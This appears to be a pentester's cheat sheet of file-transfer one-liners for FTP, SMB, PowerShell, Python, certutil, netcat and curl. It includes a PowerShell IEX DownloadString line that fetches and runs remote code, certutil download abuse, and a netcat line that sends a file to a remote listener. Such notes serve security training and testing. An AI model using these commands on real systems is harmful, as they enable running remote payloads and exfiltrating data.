FTP 
echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt
ftp -v -n -s:ftp.txt

SMB
copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux

POWERSHELL
powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
powershell "wget <URL>"

PYTHON
python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"

CERTUTIL
certutil.exe -urlcache -split -f "<URL>"

NETCAT
nc -lvp 1234 > <OUT_FILE> 
nc <IP> 1234 < <IN_FILE>
· Nc <IP> [PORT]
	• HEAD / HTTP/1.0

CURL
curl [URL] -o <OUT_FILE>

HTTP
Use "curl" to pull the source code and look for additional endpoints in "form-action' tags.
We can use curl with Conten-Legnth: 0 header
curl -s -i -X POST -H 'Content-Length: 0' http://192.168.120.209:33333/list-running-procs